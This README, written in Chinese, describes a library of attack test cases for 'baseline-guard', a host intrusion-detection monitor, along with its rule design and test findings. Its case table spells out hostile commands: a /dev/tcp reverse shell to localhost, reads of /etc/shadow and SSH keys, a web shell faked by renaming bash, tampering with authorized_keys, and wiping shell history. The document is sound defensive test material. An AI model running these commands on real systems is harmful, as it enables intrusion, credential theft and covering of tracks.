# baseline-guard 攻击用例库

14 个攻击用例（case-01~06 为 W4/W5 基础用例，case-07~14 为 W6 D1 规则包配套用例），
每个用例 = `run.sh`（攻击动作）+ `verify.sh`（预期事件核对）+ `cleanup.sh`（清理步骤）。
所有用例对同一 monitor 实例执行，验证脚本查询 `events.db`（遥测事件）和 `baseline.db`（alerts 表），
用打标机（mark）做增量计数，因此用例可以连跑多遍、结果互不干扰。

## 用例清单

| 编号 | 名称 | 攻击动作 | 预期事件 | 清理 |
|---|---|---|---|---|
| case-01 | 反弹 shell | `bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'`（本机 nc 监听配合） | process.exec(bash) ×≥2；network.connect 127.0.0.1:4444 ×≥1 | 杀掉 nc 监听 |
| case-02 | 读 /etc/shadow | `cat /etc/shadow`（root） | alerts(/etc/shadow, read)；file.read 事件带进程全路径 + 祖先链 | 无副作用 |
| case-03 | chmod 777 敏感文件 | `chmod 777 /tmp/bg-attack-cases/chmod-target.conf` | alerts(perm/chmod)；file.chmod 事件带操作者进程 | 恢复 644 |
| case-04 | 容器内执行 docker 命令 | 容器挂载 docker.sock 执行 `docker ps` | 容器内 process.exec ×≥1，container_id 为 12 位短 ID。**已知边界**：net_watch 只覆盖 TCPv4+DNS，AF_UNIX 连接无网络事件，以 exec 链+容器归属为判定信号 | 容器 --rm 自清理 |
| case-05 | 敏感路径批量读取 | root 下循环 `cat /etc/shadow /etc/gshadow /root/.ssh/id_rsa` | 每个文件各 ≥1 条 file.read，进程链完整（exe 非空 + ancestors ≥1）；AC-05A/05B alerts ×≥2（shadow 告警与 case-02 共用规则/节流窗口，见实测发现 5） | 假密钥由 run_all 统一删 |
| case-06 | 容器内篡改挂载的基线文件（M0-1 验收） | 容器挂载受保护文件并追加写入 | alerts 带容器短 ID（container_id 非空）；file.write 事件带同样 container_id | 恢复文件内容 |
| case-07 | 反弹 shell（解释器派生） | python3 连接 127.0.0.1:4407 监听并 `subprocess.run` 派生 bash | alerts `dsl.exec_reverse_shell_under_interpreter` ×≥1 | 杀掉 nc 监听 |
| case-08 | 双用途网络工具执行 | `nc` 连接 127.0.0.1:4408 本地监听 | alerts `dsl.exec_reverse_shell_dual_use_tool` ×≥1 | 杀掉 nc 监听 |
| case-09 | 临时目录执行无扩展名二进制 | `/tmp` 下复制 /bin/echo 为 tmpexe 并执行 | alerts `dsl.exec_suspicious_tmp_binary` ×≥1 | 删除 tmpexe |
| case-10 | webshell（web 服务派生 shell） | bash 副本改名 nginx（comm 伪造）派生 `/bin/bash -c id` | alerts `dsl.exec_webspawner_shell` ×≥1 | 删除 nginx 副本 |
| case-11 | 读 /etc/shadow（凭据类扩充规则） | `cat /etc/shadow`（root） | alerts `dsl.cred_read_shadow_whitelist` ×≥1 | 无副作用 |
| case-12 | 写 /etc/passwd | 追加一行到**测试替身** `/tmp/bg-attack-cases/passwd-copy` | alerts `dsl.cred_write_etc_passwd` ×≥1（file_path 为替身路径） | 原地覆盖恢复替身内容 |
| case-13 | 篡改 authorized_keys | 向测试家目录 `.ssh/authorized_keys` 追加攻击者公钥 | alerts `dsl.cred_tamper_authorized_keys` ×≥1 | 原地覆盖去除追加行 |
| case-14 | 清空 shell 历史 | `dd` 覆写测试家目录 `.bash_history`（conv=notrunc 保 inode；只有真实 write 才产生 file.write 事件） | alerts `dsl.cred_clear_shell_history` ×≥1 | 追加写恢复内容 |

## W6 D1 用例（07~14）设计说明

1. **file 类规则的前提**：DSL 规则的 file.* 条件只对 config.yaml `rules:` 注册的 inode 生效（引擎缺口 G6），
   因此 AC-12/12B/13/14 四条监控规则是为 DSL 规则供事件的前置注册，且**测试文件必须先于 monitor 启动创建**。
2. **inode 稳定性**：用例与 cleanup 只追加/截断/原地覆盖（`cat >`），**禁止 `sed -i`、`rm` 后重建**——inode 变化后第 2 轮无事件。
3. **写 /etc/passwd 的替身选型（case-12）**：安全约束禁止写真实 /etc/passwd。两个候选：
   - bind-mount 副本覆盖 /etc/passwd 再写——**否决**：LSM 事件按 inode 过滤，bind 后目标 inode 不是已注册 inode，无事件（G6/G7）。
   - 替身路径写入规则 condition 列表——**采纳**：`file.path in (/etc/passwd, /tmp/bg-attack-cases/passwd-copy)`，DSL 无变量/宏，只能硬编码两条路径。
4. **comm 伪造技巧（case-10）**：comm 取 exec 文件的 basename（非 argv[0]），`cp /bin/bash nginx` 即得到 comm=nginx 的父进程，无需真实 web 服务。
5. **exec 类规则不验证告警以外的网络事件**：network 事件未接入规则引擎（G3），反弹 shell 的网络侧只作遥测存在，不参与 DSL 判定。
6. **引擎单事件单告警（G8）+ 按 rule_id 全局节流 10s**：用例间要防止"规则被别的用例抢走/节流"。
   实测踩过三个坑：(a) 规则 1 祖先列表含 node 时，测试框架自身（vscode node 链）让所有用例的 bash 都命中规则 1，
   既遮蔽了 case-10 的规则 4，又因节流让 case-07 窗口内无告警；(b) case-07 用 nc 做监听端会触发 dual_use 规则，
   10s 内 case-08 的 nc 告警被节流——监听端改用 python；(c) `truncate -s 0`/`cp /dev/null`/空输入 `tee` 只 open 不写数据，
   本探针只对真实 write(2) 产生 file.write 事件（kernel 7.0 实测），case-14 改用 `dd conv=notrunc` 覆写。

## 执行方式

```bash
sudo -v                          # 先缓存凭据
sudo -n bash tests/attack-cases/run_all.sh
```

run_all.sh 做的事：
1. 前置检查（sudo 凭据、baseline-guard、docker）。
2. 准备用例文件（chmod 目标、受保护基线文件；`/root/.ssh/id_rsa` 不存在时生成临时假密钥并打标）。
3. 以 `tests/attack-cases/config.yaml` 启动 monitor（LSM 或 kprobe 自动降级），等待 "Monitoring started"。
4. 14 个用例连跑 2 遍，每遍 run → verify → cleanup；轮间等待 12s 让告警节流（throttle=10s）过期，保证每遍告警都能落库。
5. SIGTERM 优雅停止 monitor，输出 PASS/FAIL 汇总。退出码 0 = 28 项（14 用例 × 2 轮）全 PASS。

单独跑某个用例（monitor 已在运行时）：

```bash
bash tests/attack-cases/case-02-read-etc-shadow/run.sh my-tag
bash tests/attack-cases/case-02-read-etc-shadow/verify.sh my-tag
```

## 配置说明（config.yaml）

- 监控路径：`/etc/shadow`、`/etc/gshadow`、`/root/.ssh/id_rsa`（read/write/delete/chmod alert）、
  `/tmp/bg-attack-cases/chmod-target.conf`、`/tmp/bg-attack-cases/protected-baseline.conf`。
- `throttle: 10`：有意调小，保证连跑 2 遍时每遍告警都能落库（仓库根 config.yaml 的 300s 节流会让第 2 遍丢告警）。
- webhook 留空，仅本地落 alerts 表。

## 实测发现（2026-10-03 首轮验证踩出，已按实际行为修正 verify 脚本）

1. **monitor 实时告警固定落系统库 `/var/lib/baseline-guard/baseline.db`**（`main.cpp` 中 alert_db
   使用默认路径），与 `monitor --db` 指定的文件无关。verify 查 alerts 必须查系统库（root 权限）。
2. **规则类告警的 event_type 归一化为 `read`/`write`**（chmod 触发也是 `write`）；
   `perm_changed`/`hash_changed`/`missing` 只属于离线基线核查（rule_id=`baseline-check`）。
3. **process.exec 事件暂无 container_id 富化**（M0-1 只覆盖 file/priv/ns 类事件）；
   容器内进程的归属判据是祖先链中的 `runc` / `containerd-shim`（实测存在）。
4. 容器场景下 LSM 钩子记录的是**宿主机路径**（不是容器内的挂载路径），container_id 列为 12 位短 ID。
5. **同一文件只允许一条监控规则**：规则按 inode 注册进 `inode_to_rule` map，两条规则配同一
   路径时后加载的覆盖先加载的（本轮实测：给 /etc/shadow 加第二条规则 AC-05C 后，AC-02 整轮零告警）。
   因此 case-05 的 shadow 告警与 case-02 共用 AC-02 及其 10s 节流窗口，verify 对 shadow 告警不做硬性预期
   （事件维度验证不受影响），gshadow/id_rsa 由 AC-05A/AC-05B 独占、稳定告警。
6. verify 查询 alerts 必须带 `rule_id` 过滤，否则相邻用例的同路径告警会造成假阳性（本轮实测踩过）。

## 已知边界

- **case-04**：AF_UNIX socket 连接（docker.sock）不在 net_watch 覆盖范围（当前仅 TCPv4 connect/accept/bind + DNS）。
  判定信号为容器内 exec 链 + 祖先链容器运行时归属；unix 连接遥测、exec 事件 container_id 富化是后续迭代项。
- exec 事件的 argv/cmdline 采集在 W2 时列为边界，若仍未采集，反弹 shell 的命令行内容不可见，用 connect 事件做唯一性判定。
